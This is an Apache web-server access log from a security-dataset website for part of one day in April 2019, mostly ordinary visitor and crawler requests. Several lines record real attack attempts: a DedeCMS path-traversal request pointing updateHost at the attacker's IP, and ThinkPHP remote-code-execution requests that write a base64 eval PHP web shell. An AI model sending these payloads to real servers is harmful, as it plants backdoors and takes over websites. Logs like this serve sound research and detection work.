202.117.43.67 - - [22/Apr/2019:02:26:08 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
207.46.13.219 - - [22/Apr/2019:02:32:16 -0700] "GET /self.logs/access.log.2017-02-11.gz HTTP/1.1" 301 545 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
101.204.217.251 - - [22/Apr/2019:02:41:05 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
101.204.217.251 - - [22/Apr/2019:02:41:06 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
101.204.217.251 - - [22/Apr/2019:02:41:06 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
101.204.217.251 - - [22/Apr/2019:02:41:09 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
114.241.43.33 - - [22/Apr/2019:02:42:38 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36 LBBROWSER" 
223.104.22.193 - - [22/Apr/2019:02:43:49 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
223.104.22.193 - - [22/Apr/2019:02:43:51 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
223.104.22.193 - - [22/Apr/2019:02:43:51 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
77.75.78.165 - - [22/Apr/2019:02:45:19 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" 
77.75.78.165 - - [22/Apr/2019:02:45:20 -0700] "GET /Datasets%20Description/Network/notice.html HTTP/1.1" 304 189 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" 
103.63.2.160 - - [22/Apr/2019:02:46:38 -0700] "GET /install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=../data/admin/config_update.php HTTP/1.1" 301 714 "http://secrepo.com/install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=../data/admin/config_update.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.63.2.160 - - [22/Apr/2019:02:46:38 -0700] "GET /install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=../data/admin/config_update.php HTTP/1.1" 404 295 "http://secrepo.com/install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=../data/admin/config_update.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.63.2.160 - - [22/Apr/2019:02:46:47 -0700] "GET /install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=listcd.php&updateHost=http://103.63.2.160/ HTTP/1.1" 301 740 "http://secrepo.com/install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=listcd.php&updateHost=http://103.63.2.160/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.63.2.160 - - [22/Apr/2019:02:46:47 -0700] "GET /install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=listcd.php&updateHost=http://103.63.2.160/ HTTP/1.1" 404 295 "http://secrepo.com/install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=listcd.php&updateHost=http://103.63.2.160/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
113.171.224.176 - - [22/Apr/2019:02:46:49 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
103.63.2.160 - - [22/Apr/2019:02:46:56 -0700] "GET /install/listcd.php HTTP/1.1" 301 534 "http://secrepo.com/install/listcd.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.63.2.160 - - [22/Apr/2019:02:46:56 -0700] "GET /install/listcd.php HTTP/1.1" 404 295 "http://secrepo.com/install/listcd.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
110.93.247.147 - - [22/Apr/2019:02:51:51 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
157.55.39.3 - - [22/Apr/2019:02:53:21 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/ HTTP/1.1" 200 723 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
27.131.11.232 - - [22/Apr/2019:02:54:46 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
27.131.11.232 - - [22/Apr/2019:02:54:47 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
27.131.11.232 - - [22/Apr/2019:02:54:47 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
27.131.11.232 - - [22/Apr/2019:02:54:48 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
216.244.66.245 - - [22/Apr/2019:02:57:52 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
157.55.39.58 - - [22/Apr/2019:02:59:30 -0700] "GET /self.logs/error.log.2016-09-10.gz HTTP/1.1" 404 340 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.3 - - [22/Apr/2019:03:04:40 -0700] "GET /self.logs/error.log.2015-08-25.gz HTTP/1.1" 404 340 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
59.36.119.226 - - [22/Apr/2019:03:06:03 -0700] "GET / HTTP/1.1" 200 12474 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117" 
176.224.165.189 - - [22/Apr/2019:03:15:14 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
176.224.165.189 - - [22/Apr/2019:03:15:14 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
176.224.165.189 - - [22/Apr/2019:03:15:15 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
176.224.165.189 - - [22/Apr/2019:03:15:18 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
222.20.74.195 - - [22/Apr/2019:03:18:53 -0700] "GET / HTTP/1.1" 200 12511 "https://www.baidu.com/link?url=8EYVFZTOdaMqUxyLAwfJuY7VUvEeB6FSy5c9VQIRasq-p4yPqWHFDnqpLUVsKYeM&wd=&eqid=f6ac75ab000fcedd000000035cbd9509" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
222.20.74.195 - - [22/Apr/2019:03:18:54 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
222.20.74.195 - - [22/Apr/2019:03:18:54 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
222.20.74.195 - - [22/Apr/2019:03:18:59 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
115.156.188.230 - - [22/Apr/2019:03:19:15 -0700] "GET /auth.log/auth.log.gz HTTP/1.1" 200 554524 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
123.125.67.228 - - [22/Apr/2019:03:20:59 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
220.181.108.114 - - [22/Apr/2019:03:21:01 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
220.181.108.85 - - [22/Apr/2019:03:21:03 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
220.181.108.166 - - [22/Apr/2019:03:22:11 -0700] "GET / HTTP/1.1" 200 12474 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
100.43.90.103 - - [22/Apr/2019:03:24:20 -0700] "GET /.well-known/keybase.txt HTTP/1.1" 200 1501 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
39.104.109.170 - - [22/Apr/2019:03:24:38 -0700] "GET / HTTP/1.1" 301 498 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0" 
39.104.109.170 - - [22/Apr/2019:03:24:39 -0700] "GET / HTTP/1.1" 200 46424 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0" 
39.104.109.170 - - [22/Apr/2019:03:24:40 -0700] "GET / HTTP/1.1" 301 498 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0" 
39.104.109.170 - - [22/Apr/2019:03:24:40 -0700] "GET / HTTP/1.1" 200 46423 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0" 
111.68.106.38 - - [22/Apr/2019:03:26:59 -0700] "GET / HTTP/1.1" 200 12511 "http://www.secrepo.com/Datasets%20Description/PE_malware/VirusShare.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0" 
111.68.106.38 - - [22/Apr/2019:03:26:59 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0" 
111.68.106.38 - - [22/Apr/2019:03:27:00 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0" 
111.68.106.38 - - [22/Apr/2019:03:27:01 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 304 165 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0" 
180.163.220.126 - - [22/Apr/2019:03:28:16 -0700] "GET / HTTP/1.1" 301 483 "http://secrepo.com/" "Mozilla/5.0(compatible;MSIE9.0;WindowsNT6.1;Trident/5.0)" 
180.163.220.46 - - [22/Apr/2019:03:28:17 -0700] "GET / HTTP/1.1" 200 12511 "http://www.secrepo.com/" "Mozilla/5.0(compatible;MSIE9.0;WindowsNT6.1;Trident/5.0)" 
216.244.66.245 - - [22/Apr/2019:03:32:46 -0700] "GET /Datasets%20Description/Network/ HTTP/1.1" 200 1523 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
27.131.11.232 - - [22/Apr/2019:03:35:25 -0700] "GET /self.logs/ HTTP/1.1" 200 16007 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
27.131.11.232 - - [22/Apr/2019:03:35:27 -0700] "GET /favicon.ico HTTP/1.1" 200 267 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
27.131.11.232 - - [22/Apr/2019:03:35:54 -0700] "GET /self.logs/access.log.2019-04-17.gz HTTP/1.1" 200 33767 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
123.126.113.129 - - [22/Apr/2019:03:36:18 -0700] "GET /robots.txt HTTP/1.1" 200 252 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
123.126.113.129 - - [22/Apr/2019:03:36:19 -0700] "GET / HTTP/1.1" 200 12474 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
27.131.11.232 - - [22/Apr/2019:03:37:23 -0700] "GET /self.logs/access.log.2019-04-16.gz HTTP/1.1" 200 43651 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
27.131.11.232 - - [22/Apr/2019:03:37:25 -0700] "GET /self.logs/access.log.2019-04-15.gz HTTP/1.1" 200 32202 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
27.131.11.232 - - [22/Apr/2019:03:37:25 -0700] "GET /self.logs/access.log.2019-04-14.gz HTTP/1.1" 200 41452 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
27.131.11.232 - - [22/Apr/2019:03:37:26 -0700] "GET /self.logs/access.log.2019-04-13.gz HTTP/1.1" 200 20783 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
27.131.11.232 - - [22/Apr/2019:03:37:28 -0700] "GET /self.logs/access.log.2019-04-12.gz HTTP/1.1" 200 20153 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
27.131.11.232 - - [22/Apr/2019:03:37:28 -0700] "GET /self.logs/access.log.2019-04-11.gz HTTP/1.1" 200 32602 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
102.157.197.218 - - [22/Apr/2019:03:43:09 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
102.157.197.218 - - [22/Apr/2019:03:43:09 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
102.157.197.218 - - [22/Apr/2019:03:43:09 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
102.157.197.218 - - [22/Apr/2019:03:43:10 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
157.55.39.58 - - [22/Apr/2019:03:44:33 -0700] "GET /self.logs/access.log.2017-07-09.gz HTTP/1.1" 200 31433 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
113.171.224.176 - - [22/Apr/2019:03:49:33 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
207.46.13.219 - - [22/Apr/2019:03:53:24 -0700] "GET /self.logs/error.log.2017-03-03.gz HTTP/1.1" 200 996 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.58 - - [22/Apr/2019:03:54:11 -0700] "GET /self.logs/access.log.2017-07-21.gz HTTP/1.1" 200 36078 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
121.249.15.118 - - [22/Apr/2019:03:55:05 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
121.249.15.118 - - [22/Apr/2019:03:55:08 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
121.249.15.118 - - [22/Apr/2019:03:55:09 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
61.150.43.47 - - [22/Apr/2019:03:56:31 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0" 
88.230.176.152 - - [22/Apr/2019:03:57:12 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
88.230.176.152 - - [22/Apr/2019:03:57:12 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
41.223.160.131 - - [22/Apr/2019:03:57:38 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
14.215.176.17 - - [22/Apr/2019:03:58:24 -0700] "GET / HTTP/1.1" 200 12511 "http://www.baidu.com/s?wd=activityxry" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0" 
157.55.39.58 - - [22/Apr/2019:04:02:39 -0700] "GET /self.logs/access.log.2017-11-30.gz HTTP/1.1" 200 21515 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.48 - - [22/Apr/2019:04:04:36 -0700] "GET /self.logs/access.log.2017-10-11.gz HTTP/1.1" 200 45952 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.58 - - [22/Apr/2019:04:04:54 -0700] "GET /maccdc2012/ssh.log.gz HTTP/1.1" 200 182517 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.48 - - [22/Apr/2019:04:06:21 -0700] "GET /maccdc2012/smtp.log.gz HTTP/1.1" 200 6908 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
138.197.111.27 - - [22/Apr/2019:04:07:49 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
157.55.39.58 - - [22/Apr/2019:04:08:10 -0700] "GET /self.logs/access.log.2017-02-15.gz HTTP/1.1" 200 25216 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
176.224.165.189 - - [22/Apr/2019:04:09:13 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
223.233.80.211 - - [22/Apr/2019:04:09:50 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134" 
223.233.80.211 - - [22/Apr/2019:04:09:50 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134" 
223.233.80.211 - - [22/Apr/2019:04:09:50 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134" 
223.233.80.211 - - [22/Apr/2019:04:09:51 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134" 
121.249.15.118 - - [22/Apr/2019:04:10:43 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
49.77.235.235 - - [22/Apr/2019:04:10:58 -0700] "GET /auth.log/auth.log.gz HTTP/1.1" 200 554524 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
207.46.13.219 - - [22/Apr/2019:04:19:41 -0700] "GET /self.logs/error.log.2017-06-02.gz HTTP/1.1" 200 861 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.58 - - [22/Apr/2019:04:23:10 -0700] "GET /self.logs/error.log.2017-12-25.gz HTTP/1.1" 200 1333 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
41.223.160.131 - - [22/Apr/2019:04:24:20 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
35.224.4.53 - - [22/Apr/2019:04:28:00 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "ltx71 - (http://ltx71.com/)" 
35.224.4.53 - - [22/Apr/2019:04:29:08 -0700] "GET /maccdc2012/maccdc2012_fast_alert.7z HTTP/1.1" 200 976960 "-" "ltx71 - (http://ltx71.com/)" 
222.186.190.141 - - [22/Apr/2019:04:29:53 -0700] "GET /public/index.php/?s=index%2F%5Cthink%5Ctemplate%5Cdriver%5Cfile%2Fwrite&cacheFile=struggle.php&content=%3C%3Fphp+%40eval%28base64_decode%28%24_POST%5Bstruggle%5D%29%29%3B%3F%3E HTTP/1.1" 404 303 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36" 
222.186.190.141 - - [22/Apr/2019:04:29:55 -0700] "GET /index.php/?s=index%2F%5Cthink%5Ctemplate%5Cdriver%5Cfile%2Fwrite&cacheFile=struggle.php&content=%3C%3Fphp+%40eval%28base64_decode%28%24_POST%5Bstruggle%5D%29%29%3B%3F%3E HTTP/1.1" 404 303 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36" 
222.186.190.141 - - [22/Apr/2019:04:29:56 -0700] "GET /public/index.php/?s=%2Findex%2F%5Cthink%5Capp%2Finvokefunctionn&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=struggle.php&vars[1][]=%3C%3Fphp+%40eval%28base64_decode%28%24_POST%5Bstruggle%5D%29%29%3B%3F%3E HTTP/1.1" 404 303 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36" 
222.186.190.141 - - [22/Apr/2019:04:29:56 -0700] "GET /index.php/?s=%2Findex%2F%5Cthink%5Capp%2Finvokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=struggle.php&vars[1][]=%3C%3Fphp+%40eval%28base64_decode%28%24_POST%5Bstruggle%5D%29%29%3B%3F%3E HTTP/1.1" 404 303 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36" 
222.186.190.141 - - [22/Apr/2019:04:29:57 -0700] "POST /public/struggle.php HTTP/1.1" 404 303 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36" 
222.186.190.141 - - [22/Apr/2019:04:29:58 -0700] "POST /struggle.php HTTP/1.1" 404 303 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36" 
35.224.4.53 - - [22/Apr/2019:04:30:18 -0700] "GET /maccdc2012/maccdc2012_fast_alert.7z HTTP/1.1" 200 979800 "-" "ltx71 - (http://ltx71.com/)" 
35.224.4.53 - - [22/Apr/2019:04:31:33 -0700] "GET /maccdc2012/maccdc2012_fast_alert.7z HTTP/1.1" 200 972700 "-" "ltx71 - (http://ltx71.com/)" 
180.76.15.161 - - [22/Apr/2019:04:31:41 -0700] "GET /self.logs/?C=S;O=A HTTP/1.1" 200 18235 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
216.244.66.245 - - [22/Apr/2019:04:32:31 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
